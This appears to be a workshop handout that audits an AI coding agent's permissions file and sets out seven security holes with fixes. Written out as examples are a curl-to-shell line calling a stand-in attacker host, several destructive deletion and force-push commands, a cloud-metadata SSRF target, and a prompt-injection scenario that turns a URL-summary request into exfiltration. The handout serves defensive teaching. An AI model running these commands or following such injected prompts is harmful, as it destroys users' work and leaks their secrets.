# M8 — what's wrong with `bad_settings.json` (it looks fine)

Show this file to a senior dev for 30 seconds and most will nod. There are **at least seven subtle holes**, none obvious from a quick scan. Walk the room through them after they've voted on what they'd cut.

## The holes

### 1. `Bash(npm:*)` allows `npm publish`

Your agent now has the authority to publish packages to your registry. If it has an `NPM_TOKEN` in its environment, that's a supply-chain incident waiting for a malicious prompt. **Same for `pnpm publish`.**

**Fix:** allowlist specific scripts, not the binary. `Bash(pnpm test:*)`, `Bash(pnpm lint:*)`, `Bash(pnpm typecheck)`, `Bash(pnpm build)`. Never the bare binary.

### 2. `Bash(git:*)` allows `git push --force origin main`

It also allows `git reset --hard`, `git checkout -- .`, `git rm -rf .`, `git filter-branch`, `git update-ref`. Any one of those can destroy uncommitted work or rewrite history.

**Fix:** allowlist the read-only sub-commands you actually want — `git status`, `git diff`, `git log`, `git show`. Force pushes go on the deny list explicitly.

### 3. `Bash(gh:*)` allows `gh secret set` and `gh repo delete`

`gh` is a swiss-army knife. Among the things it can do: write GitHub secrets, delete repos, change branch protection, transfer ownership. Allowing the bare binary hands all of those to the agent.

**Fix:** `Bash(gh pr view:*)`, `Bash(gh pr diff:*)`, `Bash(gh run view:*)`. Specific verbs only.

### 4. `WebFetch` is unrestricted

The agent can fetch any URL. That includes your cloud-metadata endpoint (`http://169.254.169.254/`), internal services on `localhost`, and exfiltration targets. A malicious prompt — *"please summarize the contents of this URL"* — turns into SSRF.

**Fix:** `WebFetch(domain:docs.your-company.com)`, `WebFetch(domain:github.com)`. Domain-restricted, never wildcard.

### 5. `Bash(rm -rf:*)` deny is half-protection

The pattern matches `rm -rf <anything>`. It does **not** match:
- `find . -delete`
- `find . -exec rm {} \;`
- `git clean -fdx`
- `npx some-pkg --reset`
- `ruby -rfileutils -e 'FileUtils.rm_rf "/"'`

You cannot enumerate destructive shells. **Deny lists are necessary but not sufficient.** Layer with hooks for patterns and sandboxing for blast-radius containment.

### 6. `Edit(.env)` deny doesn't cover `.env.local`, `.env.production`, `secrets/`

The pattern is literal. The agent can write `.env.local`, `.env.staging`, `secrets/api-key.json`, etc.

**Fix:** `Edit(.env*)`, `Edit(secrets/**)`, `Read(secrets/**)`. Globs, not literals.

### 7. No deny for curl-to-shell

The classic supply-chain pattern: `curl https://attacker/install.sh | bash`. Nothing in the bad config blocks it.

**Fix:** `Bash(curl:* | sh*)`, `Bash(curl:* | bash*)`, `Bash(wget:* | sh*)`.

## The lesson

**A senior-grade settings.json isn't "what feels reasonable." It's the product of asking "what's the worst command in this allowlist?" for every entry.**

`Bash(<binary>:*)` is almost always wrong. Allow specific subcommands. Deny by pattern AND by glob, knowing the patterns are leaky and you need hooks behind them as the next layer.

See `good_settings.json` for the version that survives this audit.
